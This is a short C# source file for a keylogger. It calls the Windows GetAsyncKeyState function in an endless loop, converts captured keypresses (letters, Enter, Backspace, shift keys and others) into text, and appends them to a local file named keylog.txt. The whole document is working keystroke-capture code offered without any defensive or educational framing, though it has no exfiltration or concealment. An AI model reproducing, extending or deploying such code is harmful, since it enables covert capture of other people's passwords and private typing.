using System.IO;
using System.Runtime.InteropServices;

namespace KeyLogger
{
    class KeyLogger
    {

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(int i);

        public void ReadKeys()
        {
            string buffer = "";
            while (true)
            {
                for (int i = 0; i < 200; i++)
                {
                    int keyPressed = GetAsyncKeyState(i);
                    if (keyPressed == 32769)
                        switch (i)
                        {
                            case 33:
                                buffer += " Page up ";
                                break;
                            case 34:
                                buffer += " Page Down ";
                                break;
                            case 35:
                                buffer += "End";
                                break;
                            case 36:
                                buffer += " Home ";
                                break;
                            case 13:
                                buffer += "Enter ";
                                break;
                            case 16:
                                break;
                            case 160:
                                buffer += "Left shift ";
                                break;
                            case 161:
                                buffer += "Right shift ";
                                break;
                            case 8:
                                buffer += "Backspace ";
                                break;
                            case 9:
                                buffer += "Tab ";
                                break;
                            case 32:
                                buffer += "Space ";
                                break;
                            default:
                                buffer += (char)i;
                                break;
                        }
                }

                if (buffer.Length >= 8)
                {
                    SaveData("keylog.txt", buffer);
                    buffer = "";
                }
            }
        }

        public void SaveData(string path, string data)
        {
            File.AppendAllText(path, data);
        }

    }
}
